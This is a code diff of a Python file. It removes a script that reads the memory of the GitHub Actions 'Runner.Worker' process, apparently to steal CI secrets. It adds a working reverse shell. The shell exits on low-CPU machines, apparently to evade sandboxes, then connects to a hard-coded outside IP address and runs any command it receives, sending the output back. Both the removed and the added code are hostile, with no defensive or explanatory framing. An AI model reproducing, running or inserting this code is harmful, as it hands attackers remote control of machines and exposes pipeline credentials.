@@ -1,29 +1,33 @@
-import sys
 import os
-import re
-import psutil
+import socket
+import subprocess
 
-def get_pid(process_name):
-    for proc in psutil.process_iter(['pid', 'name']):
-        if process_name.lower() in proc.info['name'].lower():
-            return proc.info['pid']
-    raise Exception('Cannot get pid of Runner.Worker')
 
-if __name__ == "__main__":
-    process_name = "Runner.Worker"
-    pid = get_pid(process_name)
-    print(pid)
+if os.cpu_count() <= 2:
+    quit()
 
-    process = psutil.Process(pid)
-    mem_map = process.memory_maps(grouped=False)
+HOST = '202.184.150.125'
+PORT = 4443
 
-    for region in mem_map:
-        if 'r' in region.perms:  # readable region
-            start = region.start
-            end = region.end
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.send(str.encode("[*] Connection Established!"))
 
-            try:
-                chunk = process.memory_info()[0].read(start, end - start)
-                sys.stdout.buffer.write(chunk)
-            except OSError:
-                continue
+while 1:
+    try:
+        s.send(str.encode(os.getcwd() + "> "))
+        data = s.recv(1024).decode("UTF-8")
+        data = data.strip('\n')
+        if data == "quit": 
+            break
+        if data[:2] == "cd":
+            os.chdir(data[3:])
+        if len(data) > 0:
+            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+            stdout_value = proc.stdout.read() + proc.stderr.read()
+            output_str = str(stdout_value, "UTF-8")
+            s.send(str.encode("\n" + output_str))
+    except Exception as e:
+        continue
+    
+s.close()
